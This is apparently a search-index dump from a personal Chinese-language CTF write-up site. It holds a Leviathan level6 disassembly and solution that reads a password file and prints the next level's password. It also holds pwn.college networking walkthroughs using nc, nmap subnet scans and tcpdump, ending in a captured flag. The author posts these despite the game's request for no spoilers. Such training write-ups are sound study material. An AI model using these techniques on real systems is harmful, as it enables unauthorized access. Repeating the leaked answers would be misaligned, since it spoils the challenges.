$0x0 804904b: e9 e0 ff ff ff jmp 8049030 <_init+0x30> 08049050 <printf@plt>: 8049050: ff 25 10 c0 04 08 jmp *0x804c010 8049056: 68 08 00 00 00 push $0x8 804905b: e9 d0 ff ff ff jmp 8049030 <_init+0x30> 08049060 <geteuid@plt>: 8049060: ff 25 14 c0 04 08 jmp *0x804c014 8049066: 68 10 00 00 00 push $0x10 804906b: e9 c0 ff ff ff jmp 8049030 <_init+0x30> 08049070 <puts@plt>: 8049070: ff 25 18 c0 04 08 jmp *0x804c018 8049076: 68 18 00 00 00 push $0x18 804907b: e9 b0 ff ff ff jmp 8049030 <_init+0x30> 08049080 <system@plt>: 8049080: ff 25 1c c0 04 08 jmp *0x804c01c 8049086: 68 20 00 00 00 push $0x20 804908b: e9 a0 ff ff ff jmp 8049030 <_init+0x30> 08049090 <exit@plt>: 8049090: ff 25 20 c0 04 08 jmp *0x804c020 8049096: 68 28 00 00 00 push $0x28 804909b: e9 90 ff ff ff jmp 8049030 <_init+0x30> 080490a0 <setreuid@plt>: 80490a0: ff 25 24 c0 04 08 jmp *0x804c024 80490a6: 68 30 00 00 00 push $0x30 80490ab: e9 80 ff ff ff jmp 8049030 <_init+0x30> 080490b0 <atoi@plt>: 80490b0: ff 25 28 c0 04 08 jmp *0x804c028 80490b6: 68 38 00 00 00 push $0x38 80490bb: e9 70 ff ff ff jmp 8049030 <_init+0x30> Disassembly of section .text: 080490c0 <_start>: 80490c0: f3 0f 1e fb endbr32 80490c4: 31 ed xor %ebp,%ebp 80490c6: 5e pop %esi 80490c7: 89 e1 mov %esp,%ecx 80490c9: 83 e4 f0 and $0xfffffff0,%esp 80490cc: 50 push %eax 80490cd: 54 push %esp 80490ce: 52 push %edx 80490cf: e8 19 00 00 00 call 80490ed <_start+0x2d> 80490d4: 81 c3 2c 2f 00 00 add $0x2f2c,%ebx 80490da: 6a 00 push $0x0 80490dc: 6a 00 push $0x0 80490de: 51 push %ecx 80490df: 56 push %esi 80490e0: c7 c0 d6 91 04 08 mov $0x80491d6,%eax 80490e6: 50 push %eax 80490e7: e8 54 ff ff ff call 8049040 <__libc_start_main@plt> 80490ec: f4 hlt 80490ed: 8b 1c 24 mov (%esp),%ebx 80490f0: c3 ret 80490f1: 66 90 xchg %ax,%ax 80490f3: 66 90 xchg %ax,%ax 80490f5: 66 90 xchg %ax,%ax 80490f7: 66 90 xchg %ax,%ax 80490f9: 66 90 xchg %ax,%ax 80490fb: 66 90 xchg %ax,%ax 80490fd: 66 90 xchg %ax,%ax 80490ff: 90 nop 08049100 <_dl_relocate_static_pie>: 8049100: f3 0f 1e fb endbr32 8049104: c3 ret 8049105: 66 90 xchg %ax,%ax 8049107: 66 90 xchg %ax,%ax 8049109: 66 90 xchg %ax,%ax 804910b: 66 90 xchg %ax,%ax 804910d: 66 90 xchg %ax,%ax 804910f: 90 nop 08049110 <__x86.get_pc_thunk.bx>: 8049110: 8b 1c 24 mov (%esp),%ebx 8049113: c3 ret 8049114: 66 90 xchg %ax,%ax 8049116: 66 90 xchg %ax,%ax 8049118: 66 90 xchg %ax,%ax 804911a: 66 90 xchg %ax,%ax 804911c: 66 90 xchg %ax,%ax 804911e: 66 90 xchg %ax,%ax 08049120 <deregister_tm_clones>: 8049120: b8 34 c0 04 08 mov $0x804c034,%eax 8049125: 3d 34 c0 04 08 cmp $0x804c034,%eax 804912a: 74 24 je 8049150 <deregister_tm_clones+0x30> 804912c: b8 00 00 00 00 mov $0x0,%eax 8049131: 85 c0 test %eax,%eax 8049133: 74 1b je 8049150 <deregister_tm_clones+0x30> 8049135: 55 push %ebp 8049136: 89 e5 mov %esp,%ebp 8049138: 83 ec 14 sub $0x14,%esp 804913b: 68 34 c0 04 08 push $0x804c034 8049140: ff d0 call *%eax 8049142: 83 c4 10 add $0x10,%esp 8049145: c9 leave 8049146: c3 ret 8049147: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804914e: 66 90 xchg %ax,%ax 8049150: c3 ret 8049151: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 8049158: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804915f: 90 nop 08049160 <register_tm_clones>: 8049160: b8 34 c0 04 08 mov $0x804c034,%eax 8049165: 2d 34 c0 04 08 sub $0x804c034,%eax 804916a: 89 c2 mov %eax,%edx 804916c: c1 e8 1f shr $0x1f,%eax 804916f: c1 fa 02 sar $0x2,%edx 8049172: 01 d0 add %edx,%eax 8049174: d1 f8 sar %eax 8049176: 74 20 je 8049198 <register_tm_clones+0x38> 8049178: ba 00 00 00 00 mov $0x0,%edx 804917d: 85 d2 test %edx,%edx 804917f: 74 17 je 8049198 <register_tm_clones+0x38> 8049181: 55 push %ebp 8049182: 89 e5 mov %esp,%ebp 8049184: 83 ec 10 sub $0x10,%esp 8049187: 50 push %eax 8049188: 68 34 c0 04 08 push $0x804c034 804918d: ff d2 call *%edx 804918f: 83 c4 10 add $0x10,%esp 8049192: c9 leave 8049193: c3 ret 8049194: 8d 74 26 00 lea 0x0(%esi,%eiz,1),%esi 8049198: c3 ret 8049199: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491a0 <__do_global_dtors_aux>: 80491a0: f3 0f 1e fb endbr32 80491a4: 80 3d 34 c0 04 08 00 cmpb $0x0,0x804c034 80491ab: 75 1b jne 80491c8 <__do_global_dtors_aux+0x28> 80491ad: 55 push %ebp 80491ae: 89 e5 mov %esp,%ebp 80491b0: 83 ec 08 sub $0x8,%esp 80491b3: e8 68 ff ff ff call 8049120 <deregister_tm_clones> 80491b8: c6 05 34 c0 04 08 01 movb $0x1,0x804c034 80491bf: c9 leave 80491c0: c3 ret 80491c1: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 80491c8: c3 ret 80491c9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491d0 <frame_dummy>: 80491d0: f3 0f 1e fb endbr32 80491d4: eb 8a jmp 8049160 <register_tm_clones> 080491d6 <main>: 80491d6: 8d 4c 24 04 lea 0x4(%esp),%ecx 80491da: 83 e4 f0 and $0xfffffff0,%esp 80491dd: ff 71 fc push -0x4(%ecx) 80491e0: 55 push %ebp 80491e1: 89 e5 mov %esp,%ebp 80491e3: 53 push %ebx 80491e4: 51 push %ecx 80491e5: 83 ec 10 sub $0x10,%esp 80491e8: 89 c8 mov %ecx,%eax 80491ea: c7 45 f4 d3 1b 00 00 movl $0x1bd3,-0xc(%ebp) 80491f1: 83 38 02 cmpl $0x2,(%eax) 80491f4: 74 20 je 8049216 <main+0x40> 80491f6: 8b 40 04 mov 0x4(%eax),%eax 80491f9: 8b 00 mov (%eax),%eax 80491fb: 83 ec 08 sub $0x8,%esp 80491fe: 50 push %eax 80491ff: 68 08 a0 04 08 push $0x804a008 8049204: e8 47 fe ff ff call 8049050 <printf@plt> 8049209: 83 c4 10 add $0x10,%esp 804920c: 83 ec 0c sub $0xc,%esp 804920f: 6a ff push $0xffffffff 8049211: e8 7a fe ff ff call 8049090 <exit@plt> 8049216: 8b 40 04 mov 0x4(%eax),%eax 8049219: 83 c0 04 add $0x4,%eax 804921c: 8b 00 mov (%eax),%eax 804921e: 83 ec 0c sub $0xc,%esp 8049221: 50 push %eax 8049222: e8 89 fe ff ff call 80490b0 <atoi@plt> 8049227: 83 c4 10 add $0x10,%esp 804922a: 39 45 f4 cmp %eax,-0xc(%ebp) 804922d: 75 2b jne 804925a <main+0x84> 804922f: e8 2c fe ff ff call 8049060 <geteuid@plt> 8049234: 89 c3 mov %eax,%ebx 8049236: e8 25 fe ff ff call 8049060 <geteuid@plt> 804923b: 83 ec 08 sub $0x8,%esp 804923e: 53 push %ebx 804923f: 50 push %eax 8049240: e8 5b fe ff ff call 80490a0 <setreuid@plt> 8049245: 83 c4 10 add $0x10,%esp 8049248: 83 ec 0c sub $0xc,%esp 804924b: 68 22 a0 04 08 push $0x804a022 8049250: e8 2b fe ff ff call 8049080 <system@plt> 8049255: 83 c4 10 add $0x10,%esp 8049258: eb 10 jmp 804926a <main+0x94> 804925a: 83 ec 0c sub $0xc,%esp 804925d: 68 2a a0 04 08 push $0x804a02a 8049262: e8 09 fe ff ff call 8049070 <puts@plt> 8049267: 83 c4 10 add $0x10,%esp 804926a: b8 00 00 00 00 mov $0x0,%eax 804926f: 8d 65 f8 lea -0x8(%ebp),%esp 8049272: 59 pop %ecx 8049273: 5b pop %ebx 8049274: 5d pop %ebp 8049275: 8d 61 fc lea -0x4(%ecx),%esp 8049278: c3 ret Disassembly of section .fini: 0804927c <_fini>: 804927c: f3 0f 1e fb endbr32 8049280: 53 push %ebx 8049281: 83 ec 08 sub $0x8,%esp 8049284: e8 87 fe ff ff call 8049110 <__x86.get_pc_thunk.bx> 8049289: 81 c3 77 2d 00 00 add $0x2d77,%ebx 804928f: 83 c4 08 add $0x8,%esp 8049292: 5b pop %ebx 8049293: c3 ret \u8fd8\u662fmovl\u8fd9\u4e00\u53e5\u627e\u7acb\u5373\u6570 80491ea: c7 45 f4 d3 1b 00 00 movl $0x1bd3,-0xc(%ebp) 0x1bd3\u6362\u7b97\u4e00\u4e0b\u662f7123 \u7136\u540e\u5f97\u5230\u5bc6\u7801 leviathan6@gibson:~$ ./leviathan6 7123 $ cat /etc/leviathan_pass/leviathan7 8GpZ5f8Hze $ \u8fdb\u5f69\u86cb leviathan7@gibson:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -r--r----- 1 leviathan7 leviathan7 178 Apr 23 18:05 CONGRATULATIONS -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan7@gibson:~$ cat CONGRATULATIONS Well Done, you seem to have used a *nix system before, now try something more serious. (Please don't post writeups, solutions or spoilers about the games on the web. Thank you!) leviathan7@gibson:~$ \u8fd9\u73a9\u610f\u513f\uff0c\u91cc\u9762\u6709\u5927\u91cf\u7684\u4e1c\u897f\u53ef\u4e0d\u662flinux\u64cd\u4f5c\u554a\uff0c\u8fd9\u91cc\u9762\u6709\u9605\u8bfb\u6c47\u7f16\u7684\u5185\u5bb9\u7684\u4e8b\u513f\uff0c\u53ef\u5e95\u5c42\u3002\u3002\u3002 \u88ab\u9a97\u7684\u5f88\u60e8\u554a\uff0c\u8fd9\u91cc\u9762\u8981\u4f1a\u7684linux\u662f\u4e0d\u662f\u6307RHCA\u90a3\u79cd\uff0c\u90a3\u53ef\u771f\u5c4c \u548b\u56de\u4e8b\u513f\uff0c\u4eba\u5bb6\u4e0d\u8ba9\u4f20\u7b54\u6848\uff0caz\uff0c\u53cd\u6b63\u6211\u6ca1\u5565\u6d41\u91cf\uff0c\u5c31\u4f20\u4e86\u5427\u3002\u3002\u3002","title":"level7"},{"location":"en/","text":"CTF-CLASS \u4e00\u4e2a\u5b58\u4e86\u5f88\u591aWP\u7684\u5730\u65b9 CSE365 sp23 \u5b98\u7f51\u5728 \u8fd9\u513f ,\u6211\u7684\u76ee\u5f55\u5728 \u8fd9\u513f ,\u770b\u8d77\u6765\u5f88\u5165\u95e8\u7684\u8bfe\uff0c\u6682\u65f6\u505a\u4e86\u4e00\u90e8\u5206\uff0c\u627e\u4e00\u6bb5\u65f6\u95f4\u628apwn college\u7684\u4e1c\u897f\u90fd\u505a\u5b8c\u7136\u540e\u653e\u4e0a\u6765\u3002 Talking Web Assembly Crash Course Building a Web Server Reverse Engineering Intercepting Communication Cryptography Web Security Binary Exploitation Wargame \u53d1\u73b0\u7684\u4e00\u4e2a\u5c0f\u7684 \u5b89\u5168\u7f51\u7ad9 \uff0c\u6709\u51e0\u4e2a\u7cfb\u5217\u4e5f\u633a\u5165\u95e8\uff0c\u6682\u65f6\u505a\u4e86bandit bandit Natas Leviathan Krypton Narnia Behemoth Utumno Maze Vortex Manpage Drifter FormulaOne CSE466 FALL22 Program Misuse Program Interaction Assembly Crash Course Shellcode Injection Sandboxing Debugging Refresher Reverse Engineering Memory Errors Race Conditions Kernel Security Program Exploitation System Exploitation MalwareAnalysis \u300a\u6076\u610f\u4ee3\u7801\u5206\u6790\u5b9e\u6218\u300b\u4e00\u4e66\u9605\u8bfb\u3002 CH/Lab1 CH2 CH/Lab3 CH/Lab4 CH/Lab5 CH/Lab6 CH/Lab7 CH/Lab8 CH/Lab9 CH/Lab10 CH/Lab11 CH/Lab12 CH/Lab13 CH/Lab14 CH/Lab15 CH/Lab16 CH/Lab17 CH/Lab18 CH/Lab19 CH/Lab20 CH/Lab21 TODO-LIST CSE 494 sp23 Return Oriented Programming Format String Exploits File Struct exploits Dynamic Allocator Misuse Exploitation Primitives and Memory Mastery Dynamic Allocator Exploitation Microarchitecture Exploitation","title":"ABOUT"},{"location":"en/#ctf-class","text":"\u4e00\u4e2a\u5b58\u4e86\u5f88\u591aWP\u7684\u5730\u65b9","title":"CTF-CLASS"},{"location":"en/#cse365-sp23","text":"\u5b98\u7f51\u5728 \u8fd9\u513f ,\u6211\u7684\u76ee\u5f55\u5728 \u8fd9\u513f ,\u770b\u8d77\u6765\u5f88\u5165\u95e8\u7684\u8bfe\uff0c\u6682\u65f6\u505a\u4e86\u4e00\u90e8\u5206\uff0c\u627e\u4e00\u6bb5\u65f6\u95f4\u628apwn college\u7684\u4e1c\u897f\u90fd\u505a\u5b8c\u7136\u540e\u653e\u4e0a\u6765\u3002 Talking Web Assembly Crash Course Building a Web Server Reverse Engineering Intercepting Communication Cryptography Web Security Binary Exploitation","title":"CSE365 sp23"},{"location":"en/#wargame","text":"\u53d1\u73b0\u7684\u4e00\u4e2a\u5c0f\u7684 \u5b89\u5168\u7f51\u7ad9 \uff0c\u6709\u51e0\u4e2a\u7cfb\u5217\u4e5f\u633a\u5165\u95e8\uff0c\u6682\u65f6\u505a\u4e86bandit bandit Natas Leviathan Krypton Narnia Behemoth Utumno Maze Vortex Manpage Drifter FormulaOne","title":"Wargame"},{"location":"en/#cse466-fall22","text":"Program Misuse Program Interaction Assembly Crash Course Shellcode Injection Sandboxing Debugging Refresher Reverse Engineering Memory Errors Race Conditions Kernel Security Program Exploitation System Exploitation","title":"CSE466 FALL22"},{"location":"en/#malwareanalysis","text":"\u300a\u6076\u610f\u4ee3\u7801\u5206\u6790\u5b9e\u6218\u300b\u4e00\u4e66\u9605\u8bfb\u3002 CH/Lab1 CH2 CH/Lab3 CH/Lab4 CH/Lab5 CH/Lab6 CH/Lab7 CH/Lab8 CH/Lab9 CH/Lab10 CH/Lab11 CH/Lab12 CH/Lab13 CH/Lab14 CH/Lab15 CH/Lab16 CH/Lab17 CH/Lab18 CH/Lab19 CH/Lab20 CH/Lab21","title":"MalwareAnalysis"},{"location":"en/#todo-list","text":"CSE 494 sp23 Return Oriented Programming Format String Exploits File Struct exploits Dynamic Allocator Misuse Exploitation Primitives and Memory Mastery Dynamic Allocator Exploitation Microarchitecture Exploitation","title":"TODO-LIST"},{"location":"en/CSE365/","text":"CSE365 sp23\uff0c\u4e0d\u5f97\u4e0d\u8bf4pwn college\u771f\u662f\u7cbe\u54c1\u7f51\u7ad9\uff0c\u9898\u76ee\u5f88\u4e30\u5bcc\uff0c\u8d28\u91cf\u4e5f\u8fd8\u4e0d\u9519\uff0c\u5165\u95e8\u3001\u8fdb\u9636\u90fd\u6709\uff0c\u800c\u4e14\u63d0\u4f9b\u7684\u9776\u573a\u975e\u5e38\u826f\u5fc3\uff01\u5728\u6211\u4e00\u5927\u901a\u778e\u641e\u4e4b\u540e\uff0c\u7a7a\u95f4\u5c45\u7136\u8fd8\u8fd9\u4e48\u5927\uff01 Filesystem Size Used Avail Use% Mounted on overlay 916G 169G 701G 20% / tmpfs 64M 0 64M 0% /dev tmpfs 126G 0 126G 0% /sys/fs/cgroup overlay 916G 169G 701G 20% /usr/sbin/docker-init /dev/loop79 982M 557M 360M 61% /home/hacker /dev/sdc2 916G 169G 701G 20% /etc/hosts shm 64M 0 64M 0% /dev/shm tmpfs 126G 0 126G 0% /proc/acpi tmpfs 126G 0 126G 0% /proc/scsi tmpfs 126G 0 126G 0% /sys/firmware \u800c\u4e14\u4e3b\u76ee\u5f55\u6301\u4e45\u4fdd\u5b58\uff0c\u771f\u662f\u7231\u4e86\uff01 \u6a21\u5757\u603b\u7ed3 talking web \u8fd9\u4e2a\u6a21\u5757\u6bd4\u8f83\u7b80\u5355\uff0c\u5c31\u662f\u8ba9\u4f60\u719f\u7ec3\u4f7f\u7528curl\u3001nc\u3001python\u6765\u8fdb\u884chttp\u5305\u7684\u53d1\u9001\uff0c\u662f\u6bd4\u8f83\u57fa\u7840\u7684\u3002\u4f46\u662f\u53ef\u4ee5\u90fd\u8bb0\u5f55\u4e0b\u6765\u8fd9\u4e9b\u5185\u5bb9\uff0c\u4ee5\u4fbf\u65e5\u540e\u67e5\u9605\u3002 intercepting communication \u8fd9\u4e2a\u6a21\u5757\u6d89\u53ca\u5230\u4e86\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u56db\u5c42\u7f51\u7edc\u7ed3\u6784\uff0c\u8fd8\u7b97\u662f\u6709\u70b9\u610f\u601d\u5427\uff0c\u5927\u591a\u6570\u6240\u9700\u8981\u7684\u77e5\u8bc6\u5176\u5b9e\u5982\u679c\u5b66\u8fc7\u8ba1\u7b97\u673a\u7f51\u7edc\u8fd9\u95e8\u8bfe\u672c\u8eab\u7684\u8bdd\uff0c\u90fd\u662f\u6700\u6700\u6d45\u663e\u7684\u3002\u4e0d\u8fc7\u8fd9\u4e2a\u6a21\u5757\u7684\u610f\u4e49\u5c31\u5728\u4e8e\u5b66\u4e60\u4e00\u4e0barp,ip,scapy\u600e\u4e48\u7528\uff0c\u770b\u770b\u8fd9\u4e9b\u77e5\u8bc6\u662f\u600e\u4e48\u5e94\u7528\u7684\uff0c\u6700\u540e\u4e00\u4e2a\u9898\u6709\u4e9b\u56f0\u96be\uff0c\u6211\u5728\u770b\u4e86\u89e3\u7b54\u4e4b\u540e\u4e5f\u662f\u95ee\u4e86\u4e00\u4e2a\u5b66\u4e86CTF\u7684\u540c\u5b66\u624d\u641e\u5b9a\uff0cG \u4e3b\u8981\u662fscapy\u7684\u5b66\u4e60\u8d44\u6599\u6709\u70b9\u513f\u5c11\uff0c\u6211\u641c\u4e86\u4e0d\u5c11\u4e5f\u6ca1\u641c\u5230\u6700\u540e\u4e00\u4e2a\u7279\u522b\u76f8\u5173\u7684\uff0c\u4e0d\u8fc7\u76f8\u4fe1\u5728\u5199\u5b8c\u8fd9\u4e9b\u6311\u6218\u4e4b\u540e\u5bf9scapy\u548c\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u7406\u89e3\u4f1a\u6709\u4e00\u5b9a\u52a0\u6df1\u7684\u3002 \u8bb2\u89e3 YOUTUBE\u4e0apwn college\u4e0a\u4f20\u4e86\u8001\u5e08\u7684\u8bb2\u89e3\uff0c\u5927\u591a\u6570\u5f88\u7ec6\u81f4\uff0c\u5c11\u90e8\u5206\u6ca1\u6709\u5b8c\u6210\u7ed9\u51fa\u8fc7\u7a0b\uff0c\u4f46\u90fd\u6709\u601d\u8def\uff0c\u9700\u8981\u81ea\u5df1\u53bb\u5b9e\u73b0\u3002\u5176\u5b9e\u5728\u5b9e\u73b0\u4e86\u4e4b\u540e\u53d1\u73b0\u4e5f\u5c31\u662f\u8fd9\u4e48\u56de\u4e8b\u513f\uff0c\u4f46\u662f\u601d\u8003\u7684\u8fc7\u7a0b\u6709\u65f6\u5019\u662f\u75db\u82e6\u7684\u3002 \u53cb\u94fe \u53e6\u4e00\u4f4d\u641e\u5b89\u5168\u7684\u76c6\u53cb\u7684 \u535a\u5ba2","title":"ABOUT CSE365"},{"location":"en/CSE365/#cse365","text":"sp23\uff0c\u4e0d\u5f97\u4e0d\u8bf4pwn college\u771f\u662f\u7cbe\u54c1\u7f51\u7ad9\uff0c\u9898\u76ee\u5f88\u4e30\u5bcc\uff0c\u8d28\u91cf\u4e5f\u8fd8\u4e0d\u9519\uff0c\u5165\u95e8\u3001\u8fdb\u9636\u90fd\u6709\uff0c\u800c\u4e14\u63d0\u4f9b\u7684\u9776\u573a\u975e\u5e38\u826f\u5fc3\uff01\u5728\u6211\u4e00\u5927\u901a\u778e\u641e\u4e4b\u540e\uff0c\u7a7a\u95f4\u5c45\u7136\u8fd8\u8fd9\u4e48\u5927\uff01 Filesystem Size Used Avail Use% Mounted on overlay 916G 169G 701G 20% / tmpfs 64M 0 64M 0% /dev tmpfs 126G 0 126G 0% /sys/fs/cgroup overlay 916G 169G 701G 20% /usr/sbin/docker-init /dev/loop79 982M 557M 360M 61% /home/hacker /dev/sdc2 916G 169G 701G 20% /etc/hosts shm 64M 0 64M 0% /dev/shm tmpfs 126G 0 126G 0% /proc/acpi tmpfs 126G 0 126G 0% /proc/scsi tmpfs 126G 0 126G 0% /sys/firmware \u800c\u4e14\u4e3b\u76ee\u5f55\u6301\u4e45\u4fdd\u5b58\uff0c\u771f\u662f\u7231\u4e86\uff01","title":"CSE365"},{"location":"en/CSE365/#_1","text":"","title":"\u6a21\u5757\u603b\u7ed3"},{"location":"en/CSE365/#talking-web","text":"\u8fd9\u4e2a\u6a21\u5757\u6bd4\u8f83\u7b80\u5355\uff0c\u5c31\u662f\u8ba9\u4f60\u719f\u7ec3\u4f7f\u7528curl\u3001nc\u3001python\u6765\u8fdb\u884chttp\u5305\u7684\u53d1\u9001\uff0c\u662f\u6bd4\u8f83\u57fa\u7840\u7684\u3002\u4f46\u662f\u53ef\u4ee5\u90fd\u8bb0\u5f55\u4e0b\u6765\u8fd9\u4e9b\u5185\u5bb9\uff0c\u4ee5\u4fbf\u65e5\u540e\u67e5\u9605\u3002","title":"talking web"},{"location":"en/CSE365/#intercepting-communication","text":"\u8fd9\u4e2a\u6a21\u5757\u6d89\u53ca\u5230\u4e86\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u56db\u5c42\u7f51\u7edc\u7ed3\u6784\uff0c\u8fd8\u7b97\u662f\u6709\u70b9\u610f\u601d\u5427\uff0c\u5927\u591a\u6570\u6240\u9700\u8981\u7684\u77e5\u8bc6\u5176\u5b9e\u5982\u679c\u5b66\u8fc7\u8ba1\u7b97\u673a\u7f51\u7edc\u8fd9\u95e8\u8bfe\u672c\u8eab\u7684\u8bdd\uff0c\u90fd\u662f\u6700\u6700\u6d45\u663e\u7684\u3002\u4e0d\u8fc7\u8fd9\u4e2a\u6a21\u5757\u7684\u610f\u4e49\u5c31\u5728\u4e8e\u5b66\u4e60\u4e00\u4e0barp,ip,scapy\u600e\u4e48\u7528\uff0c\u770b\u770b\u8fd9\u4e9b\u77e5\u8bc6\u662f\u600e\u4e48\u5e94\u7528\u7684\uff0c\u6700\u540e\u4e00\u4e2a\u9898\u6709\u4e9b\u56f0\u96be\uff0c\u6211\u5728\u770b\u4e86\u89e3\u7b54\u4e4b\u540e\u4e5f\u662f\u95ee\u4e86\u4e00\u4e2a\u5b66\u4e86CTF\u7684\u540c\u5b66\u624d\u641e\u5b9a\uff0cG \u4e3b\u8981\u662fscapy\u7684\u5b66\u4e60\u8d44\u6599\u6709\u70b9\u513f\u5c11\uff0c\u6211\u641c\u4e86\u4e0d\u5c11\u4e5f\u6ca1\u641c\u5230\u6700\u540e\u4e00\u4e2a\u7279\u522b\u76f8\u5173\u7684\uff0c\u4e0d\u8fc7\u76f8\u4fe1\u5728\u5199\u5b8c\u8fd9\u4e9b\u6311\u6218\u4e4b\u540e\u5bf9scapy\u548c\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u7406\u89e3\u4f1a\u6709\u4e00\u5b9a\u52a0\u6df1\u7684\u3002","title":"intercepting communication"},{"location":"en/CSE365/#_2","text":"YOUTUBE\u4e0apwn college\u4e0a\u4f20\u4e86\u8001\u5e08\u7684\u8bb2\u89e3\uff0c\u5927\u591a\u6570\u5f88\u7ec6\u81f4\uff0c\u5c11\u90e8\u5206\u6ca1\u6709\u5b8c\u6210\u7ed9\u51fa\u8fc7\u7a0b\uff0c\u4f46\u90fd\u6709\u601d\u8def\uff0c\u9700\u8981\u81ea\u5df1\u53bb\u5b9e\u73b0\u3002\u5176\u5b9e\u5728\u5b9e\u73b0\u4e86\u4e4b\u540e\u53d1\u73b0\u4e5f\u5c31\u662f\u8fd9\u4e48\u56de\u4e8b\u513f\uff0c\u4f46\u662f\u601d\u8003\u7684\u8fc7\u7a0b\u6709\u65f6\u5019\u662f\u75db\u82e6\u7684\u3002","title":"\u8bb2\u89e3"},{"location":"en/CSE365/#_3","text":"\u53e6\u4e00\u4f4d\u641e\u5b89\u5168\u7684\u76c6\u53cb\u7684 \u535a\u5ba2","title":"\u53cb\u94fe"},{"location":"en/CSE365/Intercepting%20Communication/","text":"Knowledge \u8fd9\u4e00\u90e8\u5206\u662f\u4e00\u4e2a\u6781\u7b80\u7248\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u77e5\u8bc6\u3002 \u5927\u6982\u610f\u601d\u662f\u4f60\u9700\u8981\u5efa\u7acb\u4e00\u4e2a\u56db\u5c42\u7f51\u7edc\u6a21\u578b\u7684\u6982\u5ff5\uff0c\u7136\u540e\u5efa\u7acb\u8d77\u6bcf\u4e00\u5c42\u6240\u4f7f\u7528\u7684\u534f\u8bae\u548c\u6570\u636e\u5305\u90fd\u662f\u4ec0\u4e48 \u4ece\u4e0b\u5f80\u4e0a\u4f9d\u6b21\u662f\u8fd9\u6837\u7684\uff1a HTTP---\u5b9e\u73b0\u529f\u80fd TCP---\u8bc6\u522b\u8fdb\u7a0b IP---\u8bc6\u522b\u4e3b\u673a ARP(ETHER)---\u7269\u7406\u7f51\u5361 \u7136\u540e\u672c\u90e8\u5206\u5c31\u662f\u7814\u7a76\u4ee5\u8fd9\u4e9b\u5305\u4e3a\u57fa\u7840\u5efa\u7acb\u8d77\u7684\u901a\u8baf\u7684\u4e00\u4e9b\u8fc7\u7a0b\u3002 \u5b9e\u7528\u5de5\u5177scapy \u53d1\u5305\u53ef\u4ee5\u770b \u8fd9\u4e2a level14\u9700\u8981\u4f7f\u7528sniff \u5176\u4ed6 tcpdump\u5df2\u7ecf\u8db3\u591f\u597d\u7528\u4e86\uff0cwireshark\u662f\u66f4\u5f3a\u5927\u7684\u56fe\u5f62\u5316\u5de5\u5177\uff0c\u53ea\u4e0d\u8fc7\u6211\u8fde\u90a3\u4e2a\u5b9e\u9a8c\u73af\u5883\u603b\u662f\u5f88\u5361\uff0c\u6240\u4ee5\u6700\u540e\u90fd\u91c7\u53d6\u547d\u4ee4\u884c\u4e86\u3002 WP level1 Connect to a remote host nc 10.0.0.3 31337 level2 Listen for a connection from a remote host nc -l 31337 level3 Find and connect to a remote host # \u626b\u63cf\u7aef\u53e3nmap -p 31337 10.0.0.0/24 root@ip-10-0-0-2:~# nmap -p 31337 10.0.0.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 22:54 UTC Nmap scan report for 10.0.0.47 Host is up (0.000090s latency). PORT STATE SERVICE 31337/tcp open Elite MAC Address: 1A:78:B6:5A:08:A8 (Unknown) Nmap scan report for 10.0.0.2 Host is up (0.000058s latency). PORT STATE SERVICE 31337/tcp closed Elite Nmap done: 256 IP addresses (2 hosts up) scanned in 28.46 seconds root@ip-10-0-0-2:~# nc 10.0.0.2 31337 root@ip-10-0-0-2:~# nc 10.0.0.47 31337 # \u51fa\u73b0flag level4 Find and connect to a remote host on a large network root@ip-10-0-0-2:~# nmap -p 31337 -T5 10.0.0.0/16 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 23:44 UTC Nmap scan report for 10.0.0.2 Host is up (0.000053s latency). PORT STATE SERVICE 31337/tcp closed Elite Nmap scan report for 10.0.211.92 Host is up (0.000093s latency). PORT STATE SERVICE 31337/tcp open Elite MAC Address: D6:5F:9A:28:AE:26 (Unknown) Nmap done: 65536 IP addresses (2 hosts up) scanned in 2583.60 seconds # \u8fd9\u4e2a\u6211\u6ca1\u5565\u597d\u529e\u6cd5\uff0c\u611f\u89c9\u65f6\u95f4\u5f88\u957f\u554a\u3002 nc 10.0.211.92 31337 level5 Monitor traffic from a remote host tcpdump -i any port 31337 # \u5148\u8fd9\u6837\u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u5305\u662f\u91cd\u590d\u7684\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u6570\u636e\u5305\u957f\u5ea6\u4e3a58\uff0c\u63a8\u6d4b\u6709\u7528 tcpdump -i any port 31337 -X # \u8fd9\u4f1a\u8f93\u51fa\u5177\u4f53\u7684\u5341\u516d\u8fdb\u5236\u548cascii\u7801 # \u7136\u540e\u5c31\u5f97\u5230\u4e86\u5177\u4f53\u7684\u5305\u4e86 01:10:28.660067 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.50004: Flags [P.], seq 1:59, ack 60, win 509, options [nop,nop,TS val 4114781018 ecr 1191307187], length 58 0x0000: 4500 006e 4d18 4000 4006 d96d 0a00 0002 E..nM.@.@..m.... 0x0010: 0a00 0003 7a69 c354 b6ab 89fa 61ea 4259 ....zi.T....a.BY 0x0020: 8018 01fd c37f 0000 0101 080a f542 935a .............B.Z 0x0030: 4701 e7b3 7077 6e2e 636f 6c6c 6567 657b G...pwn.college{ 0x0040: 5934 4a50 5173 526d 4367 4e71 636a 6e69 Y4JPQsRmCgNqcjni 0x0050: 6532 3878 7775 4961 5755 4e2e 644e 6a4e e28xwuIaWUN.dNjN 0x0060: 7a4d 444c 3251 6a4d 794d 7a57 7d0a zMDL2QjMyMzW}. level6 Monitor slow 